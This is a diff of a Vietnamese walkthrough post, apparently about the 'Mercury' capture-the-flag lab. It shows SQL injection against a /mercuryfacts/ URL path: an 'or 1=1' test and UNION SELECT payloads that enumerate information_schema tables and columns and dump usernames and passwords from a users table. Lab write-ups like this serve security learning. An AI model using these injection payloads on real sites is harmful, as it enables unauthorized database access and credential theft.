@@ -64,14 +64,6 @@ Thử câu truy vấn "thần thánh" `or 1=1` để bắt đầu khai thác:
 Đúng như mong đợi, kết quả là đã dump được tất cả các row trong sự kiện này (À, trước khi gửi request thì url-encode đã nhé!)
 <br>
 
-```
-/mercuryfacts/1 order by 2/
-```
-
-![exploit](/posts/mercury-walkthrough/exploit-2.PNG)
-
-Lỗi khi `order by 2`, có thể suy ra chỉ tồn tại 1 record ở đây.
-<br>
 Tiếp tục với câu lệnh UNION, tiến hành exploit tên database
 
 ```
@@ -80,7 +72,7 @@ Tiếp tục với câu lệnh UNION, tiến hành exploit tên database
 
 ![exploit](/posts/mercury-walkthrough/exploit-3.PNG)
 
-Tìm tên các bảng từ database đã tìm được, có tham chiếu đến `information_schema`.
+Tìm tên các bảng từ database đã tìm được, tham chiếu từ `information_schema`.
 
 ```
 /mercuryfacts/1 union select group_concat(table_name) from information_schema.tables where table_schema='mercury'/
@@ -88,7 +80,7 @@ Tìm tên các bảng từ database đã tìm được, có tham chiếu đến 
 
 ![exploit](/posts/mercury-walkthrough/exploit-4.PNG)
 
-Tìm thấy được 2 table, nhưng ta chỉ quan tâm `users`, tiếp tục tìm columns từ bảng `users`
+Có 2 bảng được trích xuất, nhưng chỉ cần quan tâm đến bảng `users`.
 
 ```
 /mercuryfacts/1 union select group_concat(column_name) from information_schema.columns where table_schema='mercury' and table_name='users'/
@@ -96,7 +88,7 @@ Tìm thấy được 2 table, nhưng ta chỉ quan tâm `users`, tiếp tục t�
 
 ![exploit](/posts/mercury-walkthrough/exploit-5.PNG)
 
-Lần lượt dump username và password
+Lần lượt dump username và password.
 
 ```
 /mercuryfacts/1 union select group_concat(username) from users/
